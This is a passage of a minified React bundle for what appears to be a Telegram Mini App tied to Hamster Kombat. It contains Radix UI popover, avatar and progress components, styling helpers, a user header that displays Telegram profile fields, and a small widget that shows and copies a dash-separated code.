  }, [u]);
  const Z = c.useRef(!1);
  zi(() => (Z.current = !0, () => {
    Z.current = !1;
  }), []), zi(() => {
    if (S && (P.current = S), C && (k.current = C), S && C) {
      if (O.current) return O.current(S, C, I);
      I();
    }
  }, [S, C, I, O, T]);
  const H = c.useMemo(() => ({
      reference: P,
      floating: k,
      setReference: p,
      setFloating: y
    }), [p, y]),
    Q = c.useMemo(() => ({
      reference: S,
      floating: C
    }), [S, C]),
    Y = c.useMemo(() => {
      const z = {
        position: n,
        left: 0,
        top: 0
      };
      if (!Q.floating) return z;
      const $ = Nf(Q.floating, d.x),
        R = Nf(Q.floating, d.y);
      return s ? {
        ...z,
        transform: "translate(" + $ + "px, " + R + "px)",
        ...($h(Q.floating) >= 1.5 && {
          willChange: "transform"
        })
      } : {
        position: n,
        left: $,
        top: R
      };
    }, [n, s, Q.floating, d.x, d.y]);
  return c.useMemo(() => ({
    ...d,
    update: I,
    refs: H,
    elements: Q,
    floatingStyles: Y
  }), [d, I, H, Q, Y]);
}
const AC = e => ({
    name: "arrow",
    options: e,
    fn(n) {
      const {
        element: r,
        padding: o
      } = "function" == typeof e ? e(n) : e;
      return r && function t(n) {
        return {}.hasOwnProperty.call(n, "current");
      }(r) ? null != r.current ? bf({
        element: r.current,
        padding: o
      }).fn(n) : {} : r ? bf({
        element: r,
        padding: o
      }).fn(n) : {};
    }
  }),
  TC = (e, t) => ({
    ...kC(e),
    options: [e, t]
  }),
  DC = (e, t) => ({
    ...PC(e),
    options: [e, t]
  }),
  IC = (e, t) => ({
    ...$C(e),
    options: [e, t]
  }),
  MC = (e, t) => ({
    ..._C(e),
    options: [e, t]
  }),
  LC = (e, t) => ({
    ...bC(e),
    options: [e, t]
  }),
  jC = (e, t) => ({
    ...NC(e),
    options: [e, t]
  }),
  zC = (e, t) => ({
    ...AC(e),
    options: [e, t]
  });
var FC = "Arrow",
  Rh = c.forwardRef((e, t) => {
    const {
      children: n,
      width: r = 10,
      height: o = 5,
      ...i
    } = e;
    return E.jsx(fe.svg, {
      ...i,
      ref: t,
      width: r,
      height: o,
      viewBox: "0 0 30 10",
      preserveAspectRatio: "none",
      children: e.asChild ? n : E.jsx("polygon", {
        points: "0,0 30,0 15,10"
      })
    });
  });
Rh.displayName = FC;
var UC = Rh;
function WC(e) {
  const [t, n] = c.useState(void 0);
  return Tt(() => {
    if (e) {
      n({
        width: e.offsetWidth,
        height: e.offsetHeight
      });
      const r = new ResizeObserver(o => {
        if (!Array.isArray(o) || !o.length) return;
        const i = o[0];
        let l, s;
        if ("borderBoxSize" in i) {
          const a = i.borderBoxSize,
            u = Array.isArray(a) ? a[0] : a;
          l = u.inlineSize, s = u.blockSize;
        } else l = e.offsetWidth, s = e.offsetHeight;
        n({
          width: l,
          height: s
        });
      });
      return r.observe(e, {
        box: "border-box"
      }), () => r.unobserve(e);
    }
    n(void 0);
  }, [e]), t;
}
var Cc = "Popper",
  [Oh, Ah] = Vo(Cc),
  [BC, Th] = Oh(Cc),
  Dh = e => {
    const {
        __scopePopper: t,
        children: n
      } = e,
      [r, o] = c.useState(null);
    return E.jsx(BC, {
      scope: t,
      anchor: r,
      onAnchorChange: o,
      children: n
    });
  };
Dh.displayName = Cc;
var Ih = "PopperAnchor",
  Mh = c.forwardRef((e, t) => {
    const {
        __scopePopper: n,
        virtualRef: r,
        ...o
      } = e,
      i = Th(Ih, n),
      l = c.useRef(null),
      s = dt(t, l);
    return c.useEffect(() => {
      i.onAnchorChange((null == r ? void 0 : r.current) || l.current);
    }), r ? null : E.jsx(fe.div, {
      ...o,
      ref: s
    });
  });
Mh.displayName = Ih;
var kc = "PopperContent",
  [VC, HC] = Oh(kc),
  Lh = c.forwardRef((e, t) => {
    var _ref2, _ref3;
    var X, Ce, pt, hn, Ac, Tc;
    const {
        __scopePopper: n,
        side: r = "bottom",
        sideOffset: o = 0,
        align: i = "center",
        alignOffset: l = 0,
        arrowPadding: s = 0,
        avoidCollisions: a = !0,
        collisionBoundary: u = [],
        collisionPadding: d = 0,
        sticky: f = "partial",
        hideWhenDetached: v = !1,
        updatePositionStrategy: g = "optimized",
        onPlaced: x,
        ...h
      } = e,
      w = Th(kc, n),
      [m, p] = c.useState(null),
      y = dt(t, jr => p(jr)),
      [S, C] = c.useState(null),
      P = WC(S),
      k = (_ref2 = null == P ? void 0 : P.width) !== null && _ref2 !== void 0 ? _ref2 : 0,
      b = (_ref3 = null == P ? void 0 : P.height) !== null && _ref3 !== void 0 ? _ref3 : 0,
      T = r + ("center" !== i ? "-" + i : ""),
      O = "number" == typeof d ? d : {
        top: 0,
        right: 0,
        bottom: 0,
        left: 0,
        ...d
      },
      U = Array.isArray(u) ? u : [u],
      I = U.length > 0,
      Z = {
        padding: O,
        boundary: U.filter(GC),
        altBoundary: I
      },
      {
        refs: H,
        floatingStyles: Q,
        placement: Y,
        isPositioned: z,
        middlewareData: $
      } = OC({
        strategy: "fixed",
        placement: T,
        whileElementsMounted: (...jr) => CC(...jr, {
          animationFrame: "always" === g
        }),
        elements: {
          reference: w.anchor
        },
        middleware: [TC({
          mainAxis: o + b,
          alignmentAxis: l
        }), a && DC({
          mainAxis: !0,
          crossAxis: !1,
          limiter: "partial" === f ? IC() : void 0,
          ...Z
        }), a && MC({
          ...Z
        }), LC({
          ...Z,
          apply: ({
            elements: jr,
            rects: Dc,
            availableWidth: Ig,
            availableHeight: Mg
          }) => {
            const {
                width: Lg,
                height: jg
              } = Dc.reference,
              Qo = jr.floating.style;
            Qo.setProperty("--radix-popper-available-width", `${Ig}px`), Qo.setProperty("--radix-popper-available-height", `${Mg}px`), Qo.setProperty("--radix-popper-anchor-width", `${Lg}px`), Qo.setProperty("--radix-popper-anchor-height", `${jg}px`);
          }
        }), S && zC({
          element: S,
          padding: s
        }), QC({
          arrowWidth: k,
          arrowHeight: b
        }), v && jC({
          strategy: "referenceHidden",
          ...Z
        })]
      }),
      [R, M] = Fh(Y),
      V = Dt(x);
    Tt(() => {
      z && (null == V || V());
    }, [z, V]);
    const _ = null == (X = $.arrow) ? void 0 : X.x,
      L = null == (Ce = $.arrow) ? void 0 : Ce.y,
      j = 0 !== (null == (pt = $.arrow) ? void 0 : pt.centerOffset),
      [D, B] = c.useState();
    return Tt(() => {
      m && B(window.getComputedStyle(m).zIndex);
    }, [m]), E.jsx("div", {
      ref: H.setFloating,
      "data-radix-popper-content-wrapper": "",
      style: {
        ...Q,
        transform: z ? Q.transform : "translate(0, -200%)",
        minWidth: "max-content",
        zIndex: D,
        "--radix-popper-transform-origin": [null == (hn = $.transformOrigin) ? void 0 : hn.x, null == (Ac = $.transformOrigin) ? void 0 : Ac.y].join(" "),
        ...((null == (Tc = $.hide) ? void 0 : Tc.referenceHidden) && {
          visibility: "hidden",
          pointerEvents: "none"
        })
      },
      dir: e.dir,
      children: E.jsx(VC, {
        scope: n,
        placedSide: R,
        onArrowChange: C,
        arrowX: _,
        arrowY: L,
        shouldHideArrow: j,
        children: E.jsx(fe.div, {
          "data-side": R,
          "data-align": M,
          ...h,
          ref: y,
          style: {
            ...h.style,
            animation: z ? void 0 : "none"
          }
        })
      })
    });
  });
Lh.displayName = kc;
var jh = "PopperArrow",
  KC = {
    top: "bottom",
    right: "left",
    bottom: "top",
    left: "right"
  },
  zh = c.forwardRef(function (t, n) {
    const {
        __scopePopper: r,
        ...o
      } = t,
      i = HC(jh, r),
      l = KC[i.placedSide];
    return E.jsx("span", {
      ref: i.onArrowChange,
      style: {
        position: "absolute",
        left: i.arrowX,
        top: i.arrowY,
        [l]: 0,
        transformOrigin: {
          top: "",
          right: "0 0",
          bottom: "center 0",
          left: "100% 0"
        }[i.placedSide],
        transform: {
          top: "translateY(100%)",
          right: "translateY(50%) rotate(90deg) translateX(-50%)",
          bottom: "rotate(180deg)",
          left: "translateY(50%) rotate(-90deg) translateX(50%)"
        }[i.placedSide],
        visibility: i.shouldHideArrow ? "hidden" : void 0
      },
      children: E.jsx(UC, {
        ...o,
        ref: n,
        style: {
          ...o.style,
          display: "block"
        }
      })
    });
  });
function GC(e) {
  return null !== e;
}
zh.displayName = jh;
var QC = e => ({
  name: "transformOrigin",
  options: e,
  fn(t) {
    var _ref4, _ref5;
    var w, m, p;
    const {
        placement: n,
        rects: r,
        middlewareData: o
      } = t,
      l = 0 !== (null == (w = o.arrow) ? void 0 : w.centerOffset),
      s = l ? 0 : e.arrowWidth,
      a = l ? 0 : e.arrowHeight,
      [u, d] = Fh(n),
      f = {
        start: "0%",
        center: "50%",
        end: "100%"
      }[d],
      v = ((_ref4 = null == (m = o.arrow) ? void 0 : m.x) !== null && _ref4 !== void 0 ? _ref4 : 0) + s / 2,
      g = ((_ref5 = null == (p = o.arrow) ? void 0 : p.y) !== null && _ref5 !== void 0 ? _ref5 : 0) + a / 2;
    let x = "",
      h = "";
    return "bottom" === u ? (x = l ? f : `${v}px`, h = -a + "px") : "top" === u ? (x = l ? f : `${v}px`, h = `${r.floating.height + a}px`) : "right" === u ? (x = -a + "px", h = l ? f : `${g}px`) : "left" === u && (x = `${r.floating.width + a}px`, h = l ? f : `${g}px`), {
      data: {
        x: x,
        y: h
      }
    };
  }
});
function Fh(e) {
  const [t, n = "center"] = e.split("-");
  return [t, n];
}
var YC = Dh,
  Uh = Mh,
  XC = Lh,
  ZC = zh,
  Pc = "Popover",
  [Wh, IP] = Vo(Pc, [Ah]),
  Go = Ah(),
  [JC, vn] = Wh(Pc),
  Bh = e => {
    const {
        __scopePopover: t,
        children: n,
        open: r,
        defaultOpen: o,
        onOpenChange: i,
        modal: l = !1
      } = e,
      s = Go(t),
      a = c.useRef(null),
      [u, d] = c.useState(!1),
      [f = !1, v] = WS({
        prop: r,
        defaultProp: o,
        onChange: i
      });
    return E.jsx(YC, {
      ...s,
      children: E.jsx(JC, {
        scope: t,
        contentId: US(),
        triggerRef: a,
        open: f,
        onOpenChange: v,
        onOpenToggle: c.useCallback(() => v(g => !g), [v]),
        hasCustomAnchor: u,
        onCustomAnchorAdd: c.useCallback(() => d(!0), []),
        onCustomAnchorRemove: c.useCallback(() => d(!1), []),
        modal: l,
        children: n
      })
    });
  };
Bh.displayName = Pc;
var Vh = "PopoverAnchor",
  qC = c.forwardRef((e, t) => {
    const {
        __scopePopover: n,
        ...r
      } = e,
      o = vn(Vh, n),
      i = Go(n),
      {
        onCustomAnchorAdd: l,
        onCustomAnchorRemove: s
      } = o;
    return c.useEffect(() => (l(), () => s()), [l, s]), E.jsx(Uh, {
      ...i,
      ...r,
      ref: t
    });
  });
qC.displayName = Vh;
var Hh = "PopoverTrigger",
  Kh = c.forwardRef((e, t) => {
    const {
        __scopePopover: n,
        ...r
      } = e,
      o = vn(Hh, n),
      i = Go(n),
      l = dt(t, o.triggerRef),
      s = E.jsx(fe.button, {
        type: "button",
        "aria-haspopup": "dialog",
        "aria-expanded": o.open,
        "aria-controls": o.contentId,
        "data-state": Zh(o.open),
        ...r,
        ref: l,
        onClick: Ue(e.onClick, o.onOpenToggle)
      });
    return o.hasCustomAnchor ? s : E.jsx(Uh, {
      asChild: !0,
      ...i,
      children: s
    });
  });
Kh.displayName = Hh;
var _c = "PopoverPortal",
  [ek, tk] = Wh(_c, {
    forceMount: void 0
  }),
  Gh = e => {
    const {
        __scopePopover: t,
        forceMount: n,
        children: r,
        container: o
      } = e,
      i = vn(_c, t);
    return E.jsx(ek, {
      scope: t,
      forceMount: n,
      children: E.jsx(Ir, {
        present: n || i.open,
        children: E.jsx(fc, {
          asChild: !0,
          container: o,
          children: r
        })
      })
    });
  };
Gh.displayName = _c;
var br = "PopoverContent",
  Qh = c.forwardRef((e, t) => {
    const n = tk(br, e.__scopePopover),
      {
        forceMount: r = n.forceMount,
        ...o
      } = e,
      i = vn(br, e.__scopePopover);
    return E.jsx(Ir, {
      present: r || i.open,
      children: i.modal ? E.jsx(nk, {
        ...o,
        ref: t
      }) : E.jsx(rk, {
        ...o,
        ref: t
      })
    });
  });
Qh.displayName = br;
var nk = c.forwardRef((e, t) => {
    const n = vn(br, e.__scopePopover),
      r = c.useRef(null),
      o = dt(t, r),
      i = c.useRef(!1);
    return c.useEffect(() => {
      const l = r.current;
      if (l) return lc(l);
    }, []), E.jsx(pc, {
      as: Ho,
      allowPinchZoom: !0,
      children: E.jsx(Yh, {
        ...e,
        ref: o,
        trapFocus: n.open,
        disableOutsidePointerEvents: !0,
        onCloseAutoFocus: Ue(e.onCloseAutoFocus, l => {
          var s;
          l.preventDefault(), i.current || null == (s = n.triggerRef.current) || s.focus();
        }),
        onPointerDownOutside: Ue(e.onPointerDownOutside, l => {
          const s = l.detail.originalEvent,
            a = 0 === s.button && !0 === s.ctrlKey,
            u = 2 === s.button || a;
          i.current = u;
        }, {
          checkForDefaultPrevented: !1
        }),
        onFocusOutside: Ue(e.onFocusOutside, l => l.preventDefault(), {
          checkForDefaultPrevented: !1
        })
      })
    });
  }),
  rk = c.forwardRef((e, t) => {
    const n = vn(br, e.__scopePopover),
      r = c.useRef(!1),
      o = c.useRef(!1);
    return E.jsx(Yh, {
      ...e,
      ref: t,
      trapFocus: !1,
      disableOutsidePointerEvents: !1,
      onCloseAutoFocus: i => {
        var l, s;
        null == (l = e.onCloseAutoFocus) || l.call(e, i), i.defaultPrevented || (r.current || null == (s = n.triggerRef.current) || s.focus(), i.preventDefault()), r.current = !1, o.current = !1;
      },
      onInteractOutside: i => {
        var a, u;
        null == (a = e.onInteractOutside) || a.call(e, i), i.defaultPrevented || (r.current = !0, "pointerdown" === i.detail.originalEvent.type && (o.current = !0));
        const l = i.target;
        (null == (u = n.triggerRef.current) ? void 0 : u.contains(l)) && i.preventDefault(), "focusin" === i.detail.originalEvent.type && o.current && i.preventDefault();
      }
    });
  }),
  Yh = c.forwardRef((e, t) => {
    const {
        __scopePopover: n,
        trapFocus: r,
        onOpenAutoFocus: o,
        onCloseAutoFocus: i,
        disableOutsidePointerEvents: l,
        onEscapeKeyDown: s,
        onPointerDownOutside: a,
        onFocusOutside: u,
        onInteractOutside: d,
        ...f
      } = e,
      v = vn(br, n),
      g = Go(n);
    return Vv(), E.jsx(dc, {
      asChild: !0,
      loop: !0,
      trapped: r,
      onMountAutoFocus: o,
      onUnmountAutoFocus: i,
      children: E.jsx(cc, {
        asChild: !0,
        disableOutsidePointerEvents: l,
        onInteractOutside: d,
        onEscapeKeyDown: s,
        onPointerDownOutside: a,
        onFocusOutside: u,
        onDismiss: () => v.onOpenChange(!1),
        children: E.jsx(XC, {
          "data-state": Zh(v.open),
          role: "dialog",
          id: v.contentId,
          ...g,
          ...f,
          ref: t,
          style: {
            ...f.style,
            "--radix-popover-content-transform-origin": "var(--radix-popper-transform-origin)",
            "--radix-popover-content-available-width": "var(--radix-popper-available-width)",
            "--radix-popover-content-available-height": "var(--radix-popper-available-height)",
            "--radix-popover-trigger-width": "var(--radix-popper-anchor-width)",
            "--radix-popover-trigger-height": "var(--radix-popper-anchor-height)"
          }
        })
      })
    });
  }),
  Xh = "PopoverClose",
  ok = c.forwardRef((e, t) => {
    const {
        __scopePopover: n,
        ...r
      } = e,
      o = vn(Xh, n);
    return E.jsx(fe.button, {
      type: "button",
      ...r,
      ref: t,
      onClick: Ue(e.onClick, () => o.onOpenChange(!1))
    });
  });
ok.displayName = Xh;
var ik = "PopoverArrow",
  lk = c.forwardRef((e, t) => {
    const {
        __scopePopover: n,
        ...r
      } = e,
      o = Go(n);
    return E.jsx(ZC, {
      ...o,
      ...r,
      ref: t
    });
  });
function Zh(e) {
  return e ? "open" : "closed";
}
lk.displayName = ik;
var sk = Bh,
  ak = Kh,
  uk = Gh,
  Jh = Qh;
const ck = sk,
  dk = ak,
  qh = c.forwardRef(({
    className: e,
    align: t = "center",
    sideOffset: n = 4,
    ...r
  }, o) => E.jsx(uk, {
    children: E.jsx(Jh, {
      ref: o,
      align: t,
      sideOffset: n,
      className: ne("z-50 w-72 rounded-md border bg-popover p-4 text-popover-foreground shadow-md outline-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", e),
      ...r
    })
  }));
function eg(e) {
  var t,
    n,
    r = "";
  if ("string" == typeof e || "number" == typeof e) r += e;else if ("object" == typeof e) if (Array.isArray(e)) for (t = 0; t < e.length; t++) e[t] && (n = eg(e[t])) && (r && (r += " "), r += n);else for (t in e) e[t] && (r && (r += " "), r += t);
  return r;
}
function fk() {
  for (var e, t, n = 0, r = ""; n < arguments.length;) (e = arguments[n++]) && (t = eg(e)) && (r && (r += " "), r += t);
  return r;
}
qh.displayName = Jh.displayName;
const Rf = e => "boolean" == typeof e ? "".concat(e) : 0 === e ? "0" : e,
  Of = fk,
  pk = (e, t) => n => {
    var r;
    if (null == (null == t ? void 0 : t.variants)) return Of(e, null == n ? void 0 : n.class, null == n ? void 0 : n.className);
    const {
        variants: o,
        defaultVariants: i
      } = t,
      l = Object.keys(o).map(u => {
        const d = null == n ? void 0 : n[u],
          f = null == i ? void 0 : i[u];
        if (null === d) return null;
        const v = Rf(d) || Rf(f);
        return o[u][v];
      }),
      s = n && Object.entries(n).reduce((u, d) => {
        let [f, v] = d;
        return void 0 === v || (u[f] = v), u;
      }, {}),
      a = null == t || null === (r = t.compoundVariants) || void 0 === r ? void 0 : r.reduce((u, d) => {
        let {
          class: f,
          className: v,
          ...g
        } = d;
        return Object.entries(g).every(x => {
          let [h, w] = x;
          return Array.isArray(w) ? w.includes({
            ...i,
            ...s
          }[h]) : {
            ...i,
            ...s
          }[h] === w;
        }) ? [...u, f, v] : u;
      }, []);
    return Of(e, l, a, null == n ? void 0 : n.class, null == n ? void 0 : n.className);
  },
  mk = pk("inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50", {
    variants: {
      variant: {
        default: "bg-primary text-primary-foreground hover:bg-primary/90",
        destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
        outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
        secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
        ghost: "hover:bg-accent hover:text-accent-foreground",
        link: "text-primary underline-offset-4 hover:underline"
      },
      size: {
        default: "h-10 px-4 py-2",
        sm: "h-9 rounded-md px-3",
        lg: "h-11 rounded-md px-8",
        icon: "h-10 w-10"
      }
    },
    defaultVariants: {
      variant: "default",
      size: "default"
    }
  }),
  gl = c.forwardRef(({
    className: e,
    variant: t,
    size: n,
    asChild: r = !1,
    ...o
  }, i) => {
    const l = r ? Ho : "button";
    return E.jsx(l, {
      className: ne(mk({
        variant: t,
        size: n,
        className: e
      })),
      ref: i,
      ...o
    });
  });
gl.displayName = "Button";
var bc = "Avatar",
  [vk, MP] = Vo(bc),
  [hk, tg] = vk(bc),
  ng = c.forwardRef((e, t) => {
    const {
        __scopeAvatar: n,
        ...r
      } = e,
      [o, i] = c.useState("idle");
    return E.jsx(hk, {
      scope: n,
      imageLoadingStatus: o,
      onImageLoadingStatusChange: i,
      children: E.jsx(fe.span, {
        ...r,
        ref: t
      })
    });
  });
ng.displayName = bc;
var rg = "AvatarImage",
  og = c.forwardRef((e, t) => {
    const {
        __scopeAvatar: n,
        src: r,
        onLoadingStatusChange: o = () => {},
        ...i
      } = e,
      l = tg(rg, n),
      s = gk(r),
      a = Dt(u => {
        o(u), l.onImageLoadingStatusChange(u);
      });
    return Tt(() => {
      "idle" !== s && a(s);
    }, [s, a]), "loaded" === s ? E.jsx(fe.img, {
      ...i,
      ref: t,
      src: r
    }) : null;
  });
og.displayName = rg;
var ig = "AvatarFallback",
  lg = c.forwardRef((e, t) => {
    const {
        __scopeAvatar: n,
        delayMs: r,
        ...o
      } = e,
      i = tg(ig, n),
      [l, s] = c.useState(void 0 === r);
    return c.useEffect(() => {
      if (void 0 !== r) {
        const a = window.setTimeout(() => s(!0), r);
        return () => window.clearTimeout(a);
      }
    }, [r]), l && "loaded" !== i.imageLoadingStatus ? E.jsx(fe.span, {
      ...o,
      ref: t
    }) : null;
  });
function gk(e) {
  const [t, n] = c.useState("idle");
  return Tt(() => {
    if (!e) return void n("error");
    let r = !0;
    const o = new window.Image(),
      i = l => () => {
        r && n(l);
      };
    return n("loading"), o.onload = i("loaded"), o.onerror = i("error"), o.src = e, () => {
      r = !1;
    };
  }, [e]), t;
}
lg.displayName = ig;
var sg = ng,
  ag = og,
  ug = lg;
const cg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(sg, {
  ref: n,
  className: ne("relative flex h-10 w-10 shrink-0 overflow-hidden rounded-full", e),
  ...t
}));
cg.displayName = sg.displayName;
const dg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(ag, {
  ref: n,
  className: ne("aspect-square h-full w-full", e),
  ...t
}));
dg.displayName = ag.displayName;
const fg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(ug, {
  ref: n,
  className: ne("flex h-full w-full items-center justify-center rounded-full bg-muted", e),
  ...t
}));
fg.displayName = ug.displayName;
const Ie = window.Telegram.WebApp.initDataUnsafe.user;
function yk() {
  var _ref6, _ref7, _ref8;
  return E.jsxs("div", {
    className: "flex justify-between items-center py-2 px-4 border-b",
    children: [E.jsxs("div", {
      className: "flex items-center gap-2",
      children: [E.jsx("a", {
        href: "https://t.me/hamster_kombat_Bot/start?startapp=kentId541625404",
        target: "_blank",
        rel: "noopener noreferrer",
        children: E.jsx("div", {
          className: "tg-logo play"
        })
      }), E.jsxs("p", {
        children: ["version: ", "0.9.0"]
      })]
    }), E.jsxs("div", {
      className: "flex items-center gap-2",
      children: [E.jsxs(cg, {
        children: [E.jsx(dg, {
          src: "/favicon.webp"
        }), E.jsx(fg, {
          children: "CN"
        })]
      }), E.jsxs("div", {
        children: [E.jsxs("p", {
          children: [(_ref6 = null == Ie ? void 0 : Ie.first_name) !== null && _ref6 !== void 0 ? _ref6 : "Nikname", " ", (_ref7 = null == Ie ? void 0 : Ie.last_name) !== null && _ref7 !== void 0 ? _ref7 : ""]
        }), E.jsx("p", {
          className: "text-sm text-muted-foreground",
          children: null != Ie && Ie.username ? `@${Ie.username}` : (_ref8 = null == Ie ? void 0 : Ie.id) !== null && _ref8 !== void 0 ? _ref8 : "@username"
        })]
      })]
    })]
  });
}
const pg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx("div", {
  ref: n,
  className: ne("rounded-lg border bg-card text-card-foreground shadow-sm", e),
  ...t
}));
pg.displayName = "Card";
const mg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx("div", {
  ref: n,
  className: ne("flex flex-col space-y-1.5 p-6", e),
  ...t
}));
mg.displayName = "CardHeader";
const vg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx("h3", {
  ref: n,
  className: ne("text-2xl font-semibold leading-none tracking-tight", e),
  ...t
}));
vg.displayName = "CardTitle";
const hg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx("p", {
  ref: n,
  className: ne("text-sm text-muted-foreground", e),
  ...t
}));
hg.displayName = "CardDescription";
const gg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx("div", {
  ref: n,
  className: ne("p-6 pt-0", e),
  ...t
}));
gg.displayName = "CardContent";
const yg = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx("div", {
  ref: n,
  className: ne("flex items-center p-6 pt-0", e),
  ...t
}));
yg.displayName = "CardFooter";
var Nc = "Progress",
  $c = 100,
  [wk, LP] = Vo(Nc),
  [xk, Sk] = wk(Nc),
  wg = c.forwardRef((e, t) => {
    const {
      __scopeProgress: n,
      value: r = null,
      max: o,
      getValueLabel: i = Ek,
      ...l
    } = e;
    (o || 0 === o) && !Af(o) && console.error(Ck(`${o}`, "Progress"));
    const s = Af(o) ? o : $c;
    null !== r && !Tf(r, s) && console.error(kk(`${r}`, "Progress"));
    const a = Tf(r, s) ? r : null,
      u = yl(a) ? i(a, s) : void 0;
    return E.jsx(xk, {
      scope: n,
      value: a,
      max: s,
      children: E.jsx(fe.div, {
        "aria-valuemax": s,
        "aria-valuemin": 0,
        "aria-valuenow": yl(a) ? a : void 0,
        "aria-valuetext": u,
        role: "progressbar",
        "data-state": Eg(a, s),
        "data-value": a !== null && a !== void 0 ? a : void 0,
        "data-max": s,
        ...l,
        ref: t
      })
    });
  });
wg.displayName = Nc;
var xg = "ProgressIndicator",
  Sg = c.forwardRef((e, t) => {
    var _o$value;
    const {
        __scopeProgress: n,
        ...r
      } = e,
      o = Sk(xg, n);
    return E.jsx(fe.div, {
      "data-state": Eg(o.value, o.max),
      "data-value": (_o$value = o.value) !== null && _o$value !== void 0 ? _o$value : void 0,
      "data-max": o.max,
      ...r,
      ref: t
    });
  });
function Ek(e, t) {
  return `${Math.round(e / t * 100)}%`;
}
function Eg(e, t) {
  return null == e ? "indeterminate" : e === t ? "complete" : "loading";
}
function yl(e) {
  return "number" == typeof e;
}
function Af(e) {
  return yl(e) && !isNaN(e) && e > 0;
}
function Tf(e, t) {
  return yl(e) && !isNaN(e) && e <= t && e >= 0;
}
function Ck(e, t) {
  return `Invalid prop \`max\` of value \`${e}\` supplied to \`${t}\`. Only numbers greater than 0 are valid max values. Defaulting to \`${$c}\`.`;
}
function kk(e, t) {
  return `Invalid prop \`value\` of value \`${e}\` supplied to \`${t}\`. The \`value\` prop must be:\n  - a positive number\n  - less than the value passed to \`max\` (or ${$c} if no \`max\` prop is set)\n  - \`null\` or \`undefined\` if the progress is indeterminate.\n\nDefaulting to \`null\`.`;
}
Sg.displayName = xg;
var Cg = wg,
  Pk = Sg;
const kg = c.forwardRef(({
  className: e,
  value: t,
  ...n
}, r) => E.jsx(Cg, {
  ref: r,
  className: ne("relative h-4 w-full overflow-hidden rounded-full bg-secondary"),
  ...n,
  children: E.jsx(Pk, {
    className: ne("h-full w-full flex-1 bg-primary transition-all", e),
    style: {
      transform: `translateX(-${100 - (t || 0)}%)`
    }
  })
}));
function _k({
  className: e,
  ...t
}) {
  return E.jsx("div", {
    className: ne({
      "animate-pulse": t.animation
    }, "rounded-md bg-muted", e),
    ...t
  });
}
function bk({
  animation: e
}) {
  return E.jsx("div", {
    className: "flex gap-1",
    children: [...Array(5)].map((t, n) => E.jsx(_k, {
      animation: e,
      className: "h-8 w-[42px]"
    }, n))
  });
}
function Nk({
  code: e
}) {
  const t = e.split("-");
  return E.jsx("div", {
    className: "flex justify-between flex-1 gap-1",
    children: t.map((n, r) => E.jsx("p", {
      className: "flex justify-center items-center bg-slate-400 text-white text-xs rounded-md h-8 px-2",
      children: n
    }, r))
  });
}
function $k() {
  const [e, t] = c.useState(null);
  return {
    copiedText: e,
    copy: async function n(r) {
      if (null == navigator || !navigator.clipboard) return console.warn("clipboard not supported"), !1;
      try {
        return await navigator.clipboard.writeText(r), t(r), !0;
      } catch (o) {
        return console.warn("copy failed", o), t(null), !1;
      }
    }
  };
}
kg.displayName = Cg.displayName;
var Pg = {
    exports: {}
  },
  _g = {},
  bg = {
    exports: {}
  },
  Ng = {},
  Nr = c;
function Rk(e, t) {
  return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t;
}
var Ok = "function" == typeof Object.is ? Object.is : Rk,
  Ak = Nr.useState,
  Tk = Nr.useEffect,
  Dk = Nr.useLayoutEffect,
  Ik = Nr.useDebugValue;
function Mk(e, t) {
  var n = t(),
    r = Ak({
      inst: {
        value: n,
        getSnapshot: t
      }
    }),
    o = r[0].inst,
    i = r[1];
  return Dk(function () {
    o.value = n, o.getSnapshot = t, js(o) && i({
      inst: o
    });
  }, [e, n, t]), Tk(function () {
    return js(o) && i({
      inst: o
    }), e(function () {
      js(o) && i({
        inst: o
      });
    });
  }, [e]), Ik(n), n;
}
function js(e) {
  var t = e.getSnapshot;
  e = e.value;
  try {
    var n = t();
    return !Ok(e, n);
  } catch {
    return !0;
  }
}
function Lk(e, t) {
  return t();
}
var jk = typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u" ? Lk : Mk;
Ng.useSyncExternalStore = void 0 !== Nr.useSyncExternalStore ? Nr.useSyncExternalStore : jk, bg.exports = Ng;
var zk = bg.exports,
  Hl = c,
  Fk = zk;
function Uk(e, t) {
  return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t;
}
var Wk = "function" == typeof Object.is ? Object.is : Uk,
  Bk = Fk.useSyncExternalStore,
  Vk = Hl.useRef,
  Hk = Hl.useEffect,
  Kk = Hl.useMemo,
  Gk = Hl.useDebugValue;
_g.useSyncExternalStoreWithSelector = function (e, t, n, r, o) {
  var i = Vk(null);
  if (null === i.current) {
    var l = {
      hasValue: !1,
      value: null
    };
    i.current = l;
  } else l = i.current;
  i = Kk(function () {
    function a(g) {
      if (!u) {
        if (u = !0, d = g, g = r(g), void 0 !== o && l.hasValue) {
          var x = l.value;
          if (o(x, g)) return f = x;
        }
        return f = g;
      }
      if (x = f, Wk(d, g)) return x;
      var h = r(g);
      return void 0 !== o && o(x, h) ? x : (d = g, f = h);
    }
    var d,
      f,
      u = !1,
      v = void 0 === n ? null : n;
    return [function () {
      return a(t());
    }, null === v ? void 0 : function () {
      return a(v());
    }];
  }, [t, n, r, o]);
  var s = Bk(e, i[0], i[1]);
  return Hk(function () {
    l.hasValue = !0, l.value = s;
  }, [s]), Gk(s), s;
}, Pg.exports = _g;
var Qk = Pg.exports;
const Yk = su(Qk);
var Xk = {
  BASE_URL: "/",
  DEV: !1,
